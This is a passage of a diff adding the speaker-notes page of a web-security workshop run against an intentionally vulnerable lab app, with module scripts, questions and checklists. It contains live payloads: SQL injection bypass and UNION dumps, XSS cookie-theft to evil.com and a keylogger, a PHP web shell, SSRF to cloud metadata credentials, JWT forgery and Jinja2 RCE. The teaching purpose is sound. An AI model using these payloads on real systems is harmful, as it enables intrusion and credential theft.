@@ -1,0 +1,858 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>VulnLab — Speaker Notes</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Syne:wght@700;800&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg:     #0d1117;
+  --bg2:    #161b22;
+  --panel:  #21262d;
+  --border: #30363d;
+  --green:  #39d353;
+  --green2: #1a7f37;
+  --red:    #ff4757;
+  --yellow: #ffa502;
+  --blue:   #1e90ff;
+  --purple: #9b59b6;
+  --orange: #e17055;
+  --light:  #c9d1d9;
+  --gray:   #8b949e;
+  --mono:   'JetBrains Mono', monospace;
+  --head:   'Syne', sans-serif;
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body {
+  background: var(--bg);
+  color: var(--light);
+  font-family: var(--mono);
+  font-size: 13px;
+  height: 100vh;
+  display: flex;
+  flex-direction: column;
+  overflow: hidden;
+}
+
+.topbar {
+  height: 48px;
+  background: var(--bg2);
+  border-bottom: 2px solid var(--purple);
+  display: flex;
+  align-items: center;
+  padding: 0 1.25rem;
+  gap: 1rem;
+  flex-shrink: 0;
+}
+.logo { font-family: var(--head); font-weight: 800; font-size: 1rem; color: var(--purple); letter-spacing: 2px; }
+.sync-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--gray); margin-left: auto; }
+.sync-dot.live { background: var(--green); box-shadow: 0 0 6px var(--green); animation: pulse 2s infinite; }
+@keyframes pulse { 0%,100%{opacity:1;}50%{opacity:0.4;} }
+.sync-label { font-size: 11px; color: var(--gray); }
+
+.main { flex: 1; display: flex; overflow: hidden; }
+
+/* ── MODULE LIST (left mini sidebar) ── */
+.mini-sidebar {
+  width: 180px;
+  flex-shrink: 0;
+  background: var(--bg2);
+  border-right: 1px solid var(--border);
+  overflow-y: auto;
+  padding: 0.5rem 0;
+  scrollbar-width: thin;
+}
+.mini-item {
+  padding: 0.4rem 0.75rem;
+  font-size: 11px;
+  color: var(--gray);
+  cursor: default;
+  border-left: 2px solid transparent;
+  line-height: 1.35;
+}
+.mini-item.active {
+  color: var(--purple);
+  background: rgba(155,89,182,0.1);
+  border-left-color: var(--purple);
+}
+
+/* ── NOTES CONTENT ── */
+.notes-content {
+  flex: 1;
+  overflow-y: auto;
+  padding: 1.5rem;
+  scrollbar-width: thin;
+}
+
+/* Module indicator */
+.module-indicator {
+  display: flex;
+  align-items: center;
+  gap: 0.75rem;
+  margin-bottom: 1.25rem;
+  padding-bottom: 0.75rem;
+  border-bottom: 1px solid var(--border);
+}
+.module-num {
+  font-family: var(--head);
+  font-size: 2rem;
+  font-weight: 800;
+  color: var(--purple);
+  line-height: 1;
+}
+.module-info-title {
+  font-family: var(--head);
+  font-weight: 700;
+  font-size: 1.1rem;
+  color: var(--light);
+  line-height: 1.2;
+}
+.module-info-owasp { font-size: 10px; color: var(--gray); margin-top: 2px; }
+
+/* Timing bar */
+.timing-bar {
+  display: flex;
+  gap: 0.5rem;
+  margin-bottom: 1.25rem;
+  flex-wrap: wrap;
+}
+.time-pill {
+  font-size: 10px;
+  padding: 3px 10px;
+  border-radius: 20px;
+  border: 1px solid;
+  letter-spacing: 0.5px;
+}
+
+/* Notes sections */
+.notes-section { margin-bottom: 1.5rem; }
+.notes-section-title {
+  font-size: 9px;
+  font-weight: 700;
+  letter-spacing: 2.5px;
+  text-transform: uppercase;
+  color: var(--purple);
+  border-bottom: 1px solid rgba(155,89,182,0.3);
+  padding-bottom: 0.3rem;
+  margin-bottom: 0.75rem;
+}
+
+/* Script lines */
+.script-line {
+  display: flex;
+  gap: 0.75rem;
+  margin-bottom: 0.6rem;
+  align-items: flex-start;
+}
+.script-icon { font-size: 1rem; flex-shrink: 0; margin-top: 1px; }
+.script-text { font-size: 13px; color: var(--light); line-height: 1.6; }
+.script-text em { color: var(--yellow); font-style: normal; }
+.script-text code { color: var(--green); font-family: var(--mono); font-size: 11px; }
+
+/* Pause / question cards */
+.pause-card {
+  background: rgba(255,165,2,0.07);
+  border: 1px solid rgba(255,165,2,0.3);
+  border-left: 3px solid var(--yellow);
+  border-radius: 0 6px 6px 0;
+  padding: 0.6rem 0.85rem;
+  margin-bottom: 0.5rem;
+  font-size: 12.5px;
+  color: #ffcc55;
+  line-height: 1.5;
+}
+
+.question-card {
+  background: rgba(30,144,255,0.07);
+  border: 1px solid rgba(30,144,255,0.25);
+  border-left: 3px solid var(--blue);
+  border-radius: 0 6px 6px 0;
+  padding: 0.6rem 0.85rem;
+  margin-bottom: 0.5rem;
+  font-size: 12.5px;
+  color: #6eb5ff;
+  line-height: 1.5;
+}
+
+.mistake-card {
+  background: rgba(255,71,87,0.07);
+  border: 1px solid rgba(255,71,87,0.25);
+  border-left: 3px solid var(--red);
+  border-radius: 0 6px 6px 0;
+  padding: 0.6rem 0.85rem;
+  margin-bottom: 0.5rem;
+  font-size: 12.5px;
+  color: #ff8a95;
+  line-height: 1.5;
+}
+
+.tip-card {
+  background: rgba(57,211,83,0.07);
+  border: 1px solid rgba(57,211,83,0.25);
+  border-left: 3px solid var(--green);
+  border-radius: 0 6px 6px 0;
+  padding: 0.6rem 0.85rem;
+  margin-bottom: 0.5rem;
+  font-size: 12.5px;
+  color: #7deba0;
+  line-height: 1.5;
+}
+
+/* Checklist */
+.checklist { list-style: none; }
+.checklist li {
+  display: flex;
+  align-items: flex-start;
+  gap: 0.5rem;
+  padding: 0.35rem 0;
+  font-size: 12.5px;
+  color: var(--light);
+  border-bottom: 1px solid rgba(48,54,61,0.5);
+}
+.checklist li:last-child { border-bottom: none; }
+.check { color: var(--green2); flex-shrink: 0; }
+
+::-webkit-scrollbar { width: 5px; }
+::-webkit-scrollbar-track { background: var(--bg); }
+::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <div class="logo">🗒 SPEAKER NOTES</div>
+  <span class="sync-label" id="sync-label">syncing...</span>
+  <div class="sync-dot" id="sync-dot"></div>
+</div>
+
+<div class="main">
+  <div class="mini-sidebar" id="mini-sidebar"></div>
+  <div class="notes-content" id="notes-content">
+    <div style="color:var(--gray);padding:2rem;text-align:center;">Waiting for presentation to start...</div>
+  </div>
+</div>
+
+<script>
+// ── NOTES DATA ───────────────────────────────────────────────────────────────
+// Each entry maps to MODULES[i] in presentation.html
+const NOTES = [
+  // 0 — Intro
+  {
+    title: "Introduction",
+    owasp: "",
+    timing: [
+      { label: "~5 min", color: "var(--green)" },
+      { label: "No demo yet", color: "var(--gray)" },
+    ],
+    script: [
+      { icon: "👋", text: "Welcome everyone. Today we're going deep into <em>web application security</em> — not theory slides, actual live exploits." },
+      { icon: "🎯", text: "The app on the right is intentionally broken. Everything we cover, you'll see working in real time. Every vulnerability has two modes — <em>vulnerable</em> and <em>patched</em> — so you see both the attack and the fix." },
+      { icon: "⚠️", text: "Ground rules: everything we do here is inside this isolated app on my machine. Never run any of these techniques against systems you don't own. Ethical hacking means permission first, always." },
+      { icon: "🔑", text: "The app has four test accounts — alice, bob, charlie, admin. Passwords are in the dashboard. We'll be logging in as different users to demonstrate access control bugs." },
+    ],
+    questions: [
+      "Quick show of hands — who's used Burp Suite before?",
+      "Who knows what OWASP is?",
+    ],
+    mistakes: [],
+    checklist: [
+      "Browser open to /presentation",
+      "Dashboard visible in demo panel",
+      "Second monitor showing this notes window",
+      "DB freshly initialized (restart app if needed)",
+    ],
+    tips: [
+      "Keep the intro short — students are eager to see actual attacks. 5 minutes max then move.",
+    ],
+  },
+
+  // 1 — SQLi Auth
+  {
+    title: "SQL Injection — Auth Bypass",
+    owasp: "A03:2021",
+    timing: [
+      { label: "~15 min", color: "var(--red)" },
+      { label: "Demo: 8 min", color: "var(--yellow)" },
+      { label: "Theory: 7 min", color: "var(--blue)" },
+    ],
+    script: [
+      { icon: "🎤", text: "SQL Injection has been in the OWASP Top 10 since 2003. Twenty years. It's still the most impactful class of vulnerability because when it works — and it still works everywhere — you get the full database." },
+      { icon: "💡", text: "The core concept is simple: the developer writes a SQL query and pastes user input directly into it. The database doesn't know where the query ends and the user input begins. So if you put SQL in the input, the database executes it." },
+      { icon: "🖥️", text: "Let me show you the login form first in vulnerable mode. Normal credentials — alice, password1 — works fine. Now watch what happens with the classic payload." },
+      { icon: "⚡", text: "Type in username: <code>' OR '1'='1</code> — password: anything. Submit. The database gets: WHERE username='' OR '1'='1' AND password='anything'. '1'='1' is always true. We're in as the first user — admin." },
+      { icon: "🎤", text: "Notice the query displayed on screen. That's exactly what landed in the database. The database doesn't care that it came from a user — it executes exactly what it receives." },
+      { icon: "🛡️", text: "Now flip to safe mode. Same payload. Same username. Rejected. The parameterised query sends username as data — the question mark is a placeholder, the database never sees the user input as SQL syntax." },
+    ],
+    questions: [
+      "Why does ' OR '1'='1 work? What's the single quote doing?",
+      "If the app shows 'Invalid credentials' after our bypass — what went wrong? (Answer: result set empty, app logic checked row count)",
+      "What would admin'-- do differently from ' OR '1'='1?",
+    ],
+    mistakes: [
+      "Students forget the trailing ' — the payload needs to close the string the developer opened",
+      "Common confusion: 'but the password is still wrong' — yes, we bypassed the password check entirely by making the WHERE always true",
+      "Don't let students think parameterised queries slow the app down — they're actually faster due to query plan caching",
+    ],
+    checklist: [
+      "Demo in vulnerable mode — try ' OR '1'='1",
+      "Show the query_shown box on screen",
+      "Demo admin'-- payload",
+      "Switch to safe mode — show rejection",
+      "Explain the code diff on theory panel",
+    ],
+    tips: [
+      "Make students read the query out loud — forces them to see exactly how the injection works structurally.",
+      "If time allows: open /sqli/search and show UNION extraction next — natural progression.",
+    ],
+  },
+
+  // 2 — SQLi UNION
+  {
+    title: "SQL Injection — UNION Extract",
+    owasp: "A03:2021",
+    timing: [
+      { label: "~12 min", color: "var(--red)" },
+      { label: "Step-by-step demo", color: "var(--yellow)" },
+    ],
+    script: [
+      { icon: "🎤", text: "Auth bypass is the first thing you test. But the real damage from SQL injection is data extraction. The UNION SELECT technique lets you append a second query to the original — pulling data from any table in the database." },
+      { icon: "💡", text: "Three steps: find the column count, identify which columns accept strings, then dump the table you want." },
+      { icon: "⚡", text: "In the search box, type: <code>' ORDER BY 3--</code>. No error. Now <code>' ORDER BY 4--</code>. Error. Three columns." },
+      { icon: "⚡", text: "Now: <code>' UNION SELECT NULL,'test',NULL--</code>. The word 'test' appears in results. Column 2 is a string." },
+      { icon: "⚡", text: "Final: <code>' UNION SELECT NULL,username,password FROM users--</code>. All four users' credentials are now in our search results. admin123, password1, bob123, charlie456. The complete user table in one query." },
+      { icon: "🛡️", text: "Switch to safe mode. Same payload. The parameterised query makes UNION injection structurally impossible — the input is a string value, not SQL." },
+    ],
+    questions: [
+      "Why do we need to find column count first? What happens if we get it wrong?",
+      "What is information_schema and why is it useful to an attacker?",
+      "If passwords were hashed (bcrypt) — does UNION extraction still matter?",
+    ],
+    mistakes: [
+      "Students confuse the -- comment with #. Both work in MySQL, only -- in MSSQL/SQLite",
+      "NULLs first — don't start with strings, NULL works in any column type",
+      "The trailing space after -- is required in some parsers: --<space>",
+    ],
+    checklist: [
+      "Demo ORDER BY to find column count",
+      "Demo UNION SELECT NULL,'a',NULL to find string column",
+      "Demo full user dump",
+      "Mention sqlmap for automation — but understand manual first",
+      "Show safe mode rejection",
+    ],
+    tips: [
+      "Write the steps on a whiteboard or show the step-by-step flow on the theory panel while you demo.",
+      "The moment students see admin123 in the search results — that's the 'oh damn' moment. Let it land.",
+    ],
+  },
+
+  // 3 — XSS Reflected
+  {
+    title: "XSS — Reflected",
+    owasp: "A03:2021",
+    timing: [
+      { label: "~12 min", color: "var(--yellow)" },
+      { label: "Demo: 6 min", color: "var(--red)" },
+    ],
+    script: [
+      { icon: "🎤", text: "SQL injection attacks the database. XSS attacks the user's browser. We're not talking to the server anymore — we're talking to JavaScript." },
+      { icon: "💡", text: "Reflected XSS: the server takes your input from the URL and puts it directly in the HTML response. If that input contains a script tag, the browser executes it — because it came from the server, and the browser trusts the server." },
+      { icon: "⚡", text: "In the search box, type: <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>. An alert box pops. That's your JavaScript running in the browser. Now imagine that's fetch('//evil.com?c='+document.cookie)." },
+      { icon: "💡", text: "This alone doesn't compromise anyone — you triggered it yourself. The attack is in the URL. The attacker shares a crafted link. Victim clicks it. Their browser hits your server with the payload in the URL. Server reflects it. Script runs in victim's browser." },
+      { icon: "🛡️", text: "Safe mode: same payload, now the angle brackets become &lt; and &gt;. The browser renders them as text, not HTML. That's all HTML encoding is — telling the browser 'this is display text, not code'." },
+    ],
+    questions: [
+      "If XSS only runs in the victim's browser — what can it actually do? (cookies, keylogging, redirects, cryptomining)",
+      "What's the difference between alert(1) and alert(document.cookie)?",
+      "Why can't the attacker just read the cookie directly from their server? (same-origin policy — that's why they need to inject code into the target origin)",
+    ],
+    mistakes: [
+      "Students think alert(1) is the attack. It's the proof of concept. The attack is session theft or keylogging.",
+      "HttpOnly cookies can't be read by JS — but many sites don't set it. And XSS can do much more than steal cookies.",
+      "Some students try payloads in safe mode. Explain — the encoding happens server-side before it hits the browser.",
+    ],
+    checklist: [
+      "Demo <script>alert(1)</script> in search",
+      "Demo <img src=x onerror=alert(document.cookie)>",
+      "Show the crafted URL in browser address bar",
+      "Explain phishing angle — sharing the link",
+      "Switch to safe mode — show &lt;script&gt; in output",
+    ],
+    tips: [
+      "Open DevTools → Elements tab while the XSS fires. Show students the actual script tag in the DOM. Seeing it in the source makes it click.",
+    ],
+  },
+
+  // 4 — XSS Stored
+  {
+    title: "XSS — Stored",
+    owasp: "A03:2021",
+    timing: [
+      { label: "~10 min", color: "var(--yellow)" },
+      { label: "High impact demo", color: "var(--red)" },
+    ],
+    script: [
+      { icon: "🎤", text: "Reflected XSS requires the victim to click a link. Stored XSS requires the victim to do nothing except browse to the page. The payload lives in the database." },
+      { icon: "⚡", text: "Post a comment with: <code>&lt;script&gt;alert('Stored XSS on '+document.domain)&lt;/script&gt;</code>. Submit. Now every time anyone loads this page — including admin — that script runs." },
+      { icon: "💡", text: "Think about what that means for a comment section on a banking portal. One attacker posts one payload. Every customer who reads that thread gets their session cookie stolen. Admin logs in to moderate — attacker gets admin access." },
+      { icon: "⚡", text: "Post the keylogger payload: <code>&lt;script&gt;document.onkeypress=e=&gt;fetch('//log?k='+e.key)&lt;/script&gt;</code>. Invisible. Fires once DOM is loaded. Captures every keystroke on the page." },
+      { icon: "🛡️", text: "Safe mode: encoding happens before storage. The angle brackets become &amp;lt; in the DB. When rendered, browser sees text, not HTML. The script never executes." },
+    ],
+    questions: [
+      "Samy Worm — what made it self-propagating? (it added itself to every visitor's profile, who then became vectors)",
+      "How does stored XSS relate to CSRF? (XSS lets you bypass CSRF tokens — you're same-origin when XSS runs)",
+      "Which is more dangerous — stored or reflected? Why?",
+    ],
+    mistakes: [
+      "Students store XSS in safe mode and wonder why it doesn't fire — because the encoding happens at write time, not read time",
+      "Remind: the comment author field is also injectable — try putting a script in the name field",
+    ],
+    checklist: [
+      "Post basic alert payload as comment",
+      "Refresh page — show it fires on every load",
+      "Post keylogger payload",
+      "Post defacement payload",
+      "Switch to safe mode — post same payloads, show they render as text",
+      "Check DB in sqli/search to show how it's stored",
+    ],
+    tips: [
+      "Have a second browser tab open. After posting stored XSS, open the page in the second tab and show it fires there too — drives home the 'fires for every visitor' point.",
+    ],
+  },
+
+  // 5 — IDOR
+  {
+    title: "IDOR — Broken Access Control",
+    owasp: "A01:2021",
+    timing: [
+      { label: "~12 min", color: "var(--orange)" },
+      { label: "Easiest demo to grasp", color: "var(--green)" },
+    ],
+    script: [
+      { icon: "🎤", text: "IDOR is the number one vulnerability on the OWASP list. Not the most complex — actually one of the simplest. The server checks that you're logged in. It does not check that the object you're requesting belongs to you." },
+      { icon: "💡", text: "The difference: <em>authentication</em> = are you who you say you are. <em>Authorisation</em> = are you allowed to do what you're trying to do. IDOR breaks authorisation." },
+      { icon: "⚡", text: "Login as alice — user ID 2. Go to /idor/profile?id=2. Your profile. Now change the URL to id=1. Admin's profile. Email, SSN, bank balance, password. All of it. One URL change." },
+      { icon: "⚡", text: "Try id=3 — Bob's data. id=4 — Charlie. Every user in the system exposed by iterating a single number." },
+      { icon: "🛡️", text: "Safe mode: the server compares the requested ID to session['user_id']. If they don't match — 403 Access Denied. The user's intent doesn't matter — the server enforces the policy." },
+    ],
+    questions: [
+      "What's the difference between IDOR and SQL injection? (IDOR uses the app's own legitimate endpoint — no injection needed)",
+      "What if we used UUIDs instead of sequential integers? Still an IDOR? (Yes — if there's no ownership check. UUIDs just make guessing harder, not impossible)",
+      "Optus breach — 9.8 million customers. How long do you think the attacker was enumerating before they were caught?",
+    ],
+    mistakes: [
+      "Students confuse authentication with authorisation — spend a moment clearly separating these two concepts",
+      "Some think rate limiting would fix IDOR — it doesn't. The check must be at the object level",
+      "Remind: IDOR applies to any resource — files, messages, orders, not just user profiles",
+    ],
+    checklist: [
+      "Login as alice first (show it's authenticated)",
+      "Demo /idor/profile?id=2 (own profile)",
+      "Demo /idor/profile?id=1 (admin — highlight SSN and balance fields)",
+      "Demo /idor/orders?user_id=1 (admin's orders)",
+      "Demo /api/message/1 (API IDOR)",
+      "Switch to safe mode — show 403",
+      "Show the code diff — the one-line ownership check",
+    ],
+    tips: [
+      "This is the module where students most often have an 'I've seen this in the wild' moment. Ask if anyone has found this type of bug in a real app.",
+    ],
+  },
+
+  // 6 — CSRF
+  {
+    title: "CSRF — Cross-Site Request Forgery",
+    owasp: "A01:2021",
+    timing: [
+      { label: "~12 min", color: "var(--yellow)" },
+      { label: "Explain cookies first", color: "var(--blue)" },
+    ],
+    script: [
+      { icon: "🎤", text: "CSRF exploits one fundamental behaviour of browsers: when you make a request to a domain, the browser automatically includes that domain's cookies. Every time. Even if the request originated from a different site." },
+      { icon: "💡", text: "So if you're logged into bank.com, and an attacker's page makes a POST request to bank.com/transfer — your browser sends your session cookie. Bank.com sees an authenticated request and processes it. You don't know it happened." },
+      { icon: "⚡", text: "Show the CSRF PoC code in the theory panel. That's the entire attack. Hidden form. Auto-submit. One page visit. Transfer executes." },
+      { icon: "⚡", text: "In vulnerable mode — submit the transfer form. It goes through. No token. No verification of where the request came from." },
+      { icon: "🛡️", text: "Safe mode: see the CSRF token in the form. Random value. The server validates it on every POST. The attacker's page can't read the token — cross-origin reads are blocked by same-origin policy. So forged requests fail." },
+    ],
+    questions: [
+      "If CSRF tokens exist — why does XSS defeat them? (XSS runs same-origin — can read the token from the DOM. That's why XSS + CSRF together = complete bypass)",
+      "SameSite=Strict cookie attribute — how does it help? (browser won't send the cookie in cross-site requests at all)",
+      "Does HTTPS prevent CSRF? (no — CSRF works over HTTPS. The encryption doesn't help because the browser still sends the cookie)",
+    ],
+    mistakes: [
+      "Students think CSRF requires the attacker to know the victim's password — it doesn't. The cookie does the authentication.",
+      "Common confusion: 'the attacker can't read the response' — true, but for state-changing actions (transfers, email changes) they don't need to",
+      "Remind: GET requests should never change state. CSRF most easily exploits POST but some apps use GET for everything",
+    ],
+    checklist: [
+      "Explain cookies + browser auto-attach behaviour first",
+      "Show the PoC HTML in the theory panel",
+      "Demo transfer in vulnerable mode",
+      "Show no token in page source (right-click → view source)",
+      "Switch to safe mode — show token in source",
+      "Explain why same-origin blocks the attacker from reading the token",
+    ],
+    tips: [
+      "If students are confused — use a real analogy: someone physically guides your hand to sign a cheque while you're looking away. You performed the action. You didn't authorise it.",
+    ],
+  },
+
+  // 7 — File Upload
+  {
+    title: "File Upload → Web Shell",
+    owasp: "A03:2021",
+    timing: [
+      { label: "~15 min", color: "var(--red)" },
+      { label: "Highest wow factor", color: "var(--green)" },
+    ],
+    script: [
+      { icon: "🎤", text: "File upload vulnerabilities are one of the most satisfying bugs to demonstrate because the path from upload to full server control is so direct. We upload a script. We access it via HTTP. The server executes it." },
+      { icon: "⚡", text: "Create a file called shell.php with one line: <code>&lt;?php system($_GET['cmd']); ?&gt;</code>. That's the entire web shell." },
+      { icon: "⚡", text: "Upload it in vulnerable mode. No validation. Server saves it as shell.php in the upload directory. Click 'Open' next to the filename in the table. Add ?cmd=id to the URL. Server returns: uid=33(www-data). We have remote code execution." },
+      { icon: "💡", text: "In a real engagement this would be: ?cmd=cat /etc/passwd, ?cmd=whoami, ?cmd=ls /var/www, and eventually establishing a reverse shell. From a profile picture upload." },
+      { icon: "⚡", text: "Show the bypass techniques — shell.php.jpg, shell.pHp. Naive filters check extension, attacker double-extends or varies case." },
+      { icon: "🛡️", text: "Safe mode: magic bytes check (actual file content, not filename), extension whitelist, UUID rename so the file is never accessible at a predictable path, stored outside webroot." },
+    ],
+    questions: [
+      "Why does the server execute PHP at all? (web server is configured to pass .php files to PHP interpreter)",
+      "If we rename to shell.php.jpg — does nginx/apache serve it as PHP? (depends on config — some split on last extension, some on first)",
+      "What's a polyglot file? (valid JPEG header + PHP code — passes both magic bytes check and image validation)",
+    ],
+    mistakes: [
+      "Students upload shell.php in safe mode and wonder why it doesn't work — point to the validation steps on screen",
+      "Remind: our simulation shows the content — a real server would actually execute it",
+      "The UUID rename is critical — even if the file is uploaded safely, if the path is predictable it can still be accessed",
+    ],
+    checklist: [
+      "Show the PHP web shell code (theory panel)",
+      "Upload shell.php in vulnerable mode",
+      "Click Open → show content/simulation",
+      "Show extension bypass — shell.php.jpg",
+      "Switch to safe mode — try same uploads, show rejections",
+      "Explain magic bytes — show what FF D8 FF means",
+      "Show UUID rename output",
+    ],
+    tips: [
+      "This is the most visceral demo — students understand immediately that uploading a file and getting code execution is catastrophic. Use this energy to drive home the magic bytes + rename defence.",
+    ],
+  },
+
+  // 8 — SSRF
+  {
+    title: "SSRF — Server-Side Request Forgery",
+    owasp: "A10:2021",
+    timing: [
+      { label: "~12 min", color: "var(--cyan)" },
+      { label: "Cloud context important", color: "var(--blue)" },
+    ],
+    script: [
+      { icon: "🎤", text: "SSRF made the OWASP Top 10 in 2021 — new entry, immediate #10 — because the rise of cloud infrastructure made it devastating in a new way. The server lives in AWS. AWS has an internal metadata service. SSRF gets you in." },
+      { icon: "💡", text: "The feature exists legitimately: import from URL, preview a link, PDF generator, webhook tester. The app fetches a URL on your behalf. You point it at an internal address instead." },
+      { icon: "⚡", text: "In the fetch box: <code>http://169.254.169.254/latest/meta-data/</code>. Server fetches it. Returns a list of metadata endpoints. This is the AWS IMDS — only accessible from inside EC2 instances." },
+      { icon: "⚡", text: "Now: <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2InstanceRole</code>. AccessKeyId, SecretAccessKey, Token. These are live IAM credentials — now run aws s3 ls with them. Full cloud access." },
+      { icon: "🛡️", text: "Safe mode: blocklist of RFC1918 and metadata IP ranges. Host checked before the request is made. But also mention: check after DNS resolution too — DNS rebinding bypasses pre-resolution blocklists." },
+    ],
+    questions: [
+      "Capital One — what specific IAM permissions did the role have that enabled the breach? (S3 GetObject on all buckets)",
+      "IMDSv2 — what does it add that blocks SSRF? (requires a PUT request to get a session token first — SSRF can't do that in a single HTTP request)",
+      "How would you find SSRF during a pentest? (look for any URL parameter, webhook registration, import features)",
+    ],
+    mistakes: [
+      "Students think SSRF only works in AWS — it works against any internal service. Redis, Elasticsearch, internal admin panels, Kubernetes API",
+      "The blocklist alone isn't sufficient — DNS rebinding, IPv6, hex encoding all bypass naive blocklists",
+      "Remind: blind SSRF is still valid even if you don't see the response — use Burp Collaborator to detect DNS callbacks",
+    ],
+    checklist: [
+      "Explain what 169.254.169.254 is and why it's significant",
+      "Demo root metadata listing",
+      "Demo IAM role name discovery",
+      "Demo credential extraction — highlight AccessKeyId",
+      "Explain the Capital One breach",
+      "Switch to safe mode — show blocklist rejection",
+      "Mention IMDSv2 as defence",
+    ],
+    tips: [
+      "The Capital One case is the perfect anchor for this module. $190M fine. 106M customers. One SSRF endpoint. The scale makes it real.",
+    ],
+  },
+
+  // 9 — JWT
+  {
+    title: "JWT — None Algorithm",
+    owasp: "A07:2021",
+    timing: [
+      { label: "~12 min", color: "var(--orange)" },
+      { label: "Base64 confusion is common", color: "var(--yellow)" },
+    ],
+    script: [
+      { icon: "🎤", text: "JWT is everywhere. Every React app, every mobile backend, every microservices auth layer. And it has a family of vulnerabilities that are still found in production systems constantly." },
+      { icon: "💡", text: "JWT structure: three base64-encoded parts separated by dots. Header (algorithm), payload (claims), signature. The server validates the signature. If signature is valid — trust the claims." },
+      { icon: "⚡", text: "Login as alice — get a JWT. Paste it into jwt.io or decode the header. You'll see alg: HS256. Change it to none. Remove the signature (keep the dot). Change role in payload to admin. Re-encode." },
+      { icon: "⚡", text: "Paste the forged token into /jwt/verify?safe=0. Token accepted. Role: admin. The server skipped verification because alg was none." },
+      { icon: "🛡️", text: "Safe mode: algorithm is enforced server-side. alg:none → rejected immediately. Signature verified with strong secret. No exceptions." },
+    ],
+    questions: [
+      "Why is base64 not encryption? (it's encoding — anyone can decode it. JWT payload is public. Never put secrets in JWT payload.)",
+      "Weak secret attack — what secret would you try first? ('secret', 'password', 'jwt_secret', the app name)",
+      "What's the RS256 → HS256 confusion attack? (server has RSA public key. Attacker changes to HS256 and signs with the public key as HMAC secret. Server verifies with same public key. Valid.)",
+    ],
+    mistakes: [
+      "Students think JWT is encrypted — it's encoded. Anyone can read the payload. Never store sensitive data in JWT.",
+      "The signature validates integrity, not confidentiality. It proves the token wasn't tampered with — if the algorithm is enforced.",
+      "alg:none is only one JWT vulnerability. Also cover: weak secret, RS256→HS256, kid injection.",
+    ],
+    checklist: [
+      "Login, show JWT structure",
+      "Decode header manually (show it's base64 not encryption)",
+      "Build forged none-alg token (live or use theory panel script)",
+      "Submit to /jwt/verify?safe=0 — show admin role accepted",
+      "Switch to safe mode — show rejection",
+      "Mention hashcat -m 16500 for weak secret cracking",
+    ],
+    tips: [
+      "Open jwt.io in the demo panel as part of the demo — paste the token and show the live decode. Students immediately understand it's just base64.",
+    ],
+  },
+
+  // 10 — SSTI
+  {
+    title: "SSTI — Jinja2",
+    owasp: "A03:2021",
+    timing: [
+      { label: "~12 min", color: "var(--red)" },
+      { label: "Always leads to RCE", color: "var(--red)" },
+    ],
+    script: [
+      { icon: "🎤", text: "SSTI is one of those vulnerabilities where the moment of discovery is a single probe — {{7*7}} — and the impact is immediate RCE. Template injection bugs are critical by definition in Jinja2 because the Python object hierarchy is accessible." },
+      { icon: "⚡", text: "Try <code>{{7*7}}</code> in the name field. Output: 49. That's not a coincidence — that's Jinja2 evaluating the expression. SSTI confirmed." },
+      { icon: "⚡", text: "Now: <code>{{config}}</code>. Flask configuration dumps to the screen. SECRET_KEY, database URI, debug settings. All of it." },
+      { icon: "⚡", text: "Final: <code>{{lipsum.__globals__['os'].popen('id').read()}}</code>. Output: uid=33(www-data). We escalated from a name field to OS command execution." },
+      { icon: "💡", text: "The reason this works: Jinja2 templates have access to Python globals. Through the object hierarchy (MRO, __subclasses__) you can reach the subprocess module. lipsum is a shortcut — it's a Jinja2 global with os already accessible." },
+      { icon: "🛡️", text: "Safe mode: html.escape() before the render, or — better — use render_template() with a variable, not render_template_string() with user input concatenated in." },
+    ],
+    questions: [
+      "Detection: what probe string would you use if {{7*7}} didn't return 49? (try ${7*7} for Freemarker, #{7*7} for Ruby ERB, <%= 7*7 %> for EJS)",
+      "Why can't we sandbox Jinja2 to prevent RCE? (the sandbox was removed because it was consistently bypassable — Python's object model is too rich)",
+      "Is this exploitable if debug=False? (yes — the RCE path doesn't depend on debug mode)",
+    ],
+    mistakes: [
+      "Students try {{config}} in safe mode — it renders as literal text. Explain encoding happens before Jinja2 processes it.",
+      "Some templates auto-escape — {{variable}} might be safe but {%raw%}{{variable}}{%endraw%} or | safe filter would still be vulnerable",
+      "The MRO path (''.__class__.__mro__[1].__subclasses__()) varies by Python version — lipsum shortcut is more reliable for demo",
+    ],
+    checklist: [
+      "Demo {{7*7}} — show 49",
+      "Demo {{config}} — show SECRET_KEY",
+      "Demo RCE payload",
+      "Explain why lipsum works (global with os access)",
+      "Switch to safe mode — same payloads render as text",
+      "Show the code diff — render_template_string vs render_template",
+    ],
+    tips: [
+      "This is the module where students ask 'why would anyone write code like this?' — the answer is convenience. Developers dynamically build templates for emails, PDFs, custom messages. The bug is natural to make.",
+    ],
+  },
+
+  // 11 — Security Headers
+  {
+    title: "Security Headers",
+    owasp: "A05:2021",
+    timing: [
+      { label: "~10 min", color: "var(--cyan)" },
+      { label: "curl demo is fast", color: "var(--green)" },
+    ],
+    script: [
+      { icon: "🎤", text: "Security headers are the server's instructions to the browser. Each one blocks a class of attack. They're free to add. They take 5 minutes. And most applications are still missing several." },
+      { icon: "⚡", text: "Open terminal: <code>curl -I http://localhost:5000/headers?safe=0</code>. Headers: Content-Type, nothing else security-related. Now: <code>curl -I http://localhost:5000/headers?safe=1</code>. Six security headers appear." },
+      { icon: "💡", text: "Walk through the table: CSP blocks XSS, X-Frame-Options blocks clickjacking, HSTS forces HTTPS, nosniff blocks MIME confusion, Referrer-Policy stops URL leakage, Permissions-Policy disables features." },
+      { icon: "💡", text: "Clickjacking: without X-Frame-Options, this page can be embedded in a transparent iframe on any site. Attacker overlays a fake button. Victim clicks 'Win a Prize' but actually clicks 'Confirm Transfer'." },
+      { icon: "🛡️", text: "Adding these in Flask is six lines of code. There's no excuse for a production app to be missing them." },
+    ],
+    questions: [
+      "What does Content-Security-Policy actually do when XSS fires? (blocks inline script execution if policy doesn't allow it — XSS payload is blocked by browser)",
+      "Can HSTS be set on HTTP? (no — must be over HTTPS, otherwise trivially stripped by attacker)",
+      "Permissions-Policy — what happens if you don't set it? (features like camera and geolocation are available to any script on the page, including XSS payloads)",
+    ],
+    mistakes: [
+      "Students think CSP alone prevents XSS — it mitigates it. Input validation and output encoding still required.",
